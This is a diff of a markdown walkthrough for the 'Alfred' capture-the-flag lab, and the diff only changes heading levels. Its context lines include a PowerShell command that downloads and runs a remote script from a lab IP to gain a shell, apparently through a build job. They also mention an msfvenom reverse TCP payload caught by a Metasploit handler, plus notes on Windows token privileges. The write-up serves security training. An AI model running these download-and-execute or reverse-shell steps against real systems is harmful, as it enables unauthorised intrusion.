@@ -1,6 +1,6 @@
 # Alfred 
 
-# Task1 
+## Task1 
 
 Port scanning
 ```bash
@@ -19,7 +19,7 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.119.20:80
 
 After that we hit the build button and we gain access to the system.
 
-# Task 2 
+## Task 2 
 
 Generate renverse tcp for with the help of msfvenom
 
@@ -43,7 +43,7 @@ This step uses the Metasploit handler to receive the incoming connection from yo
 ```
 Start-Process "shell-name.exe"
 ```
-# Taks 3 
+## Taks 3 
 
 Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).
 
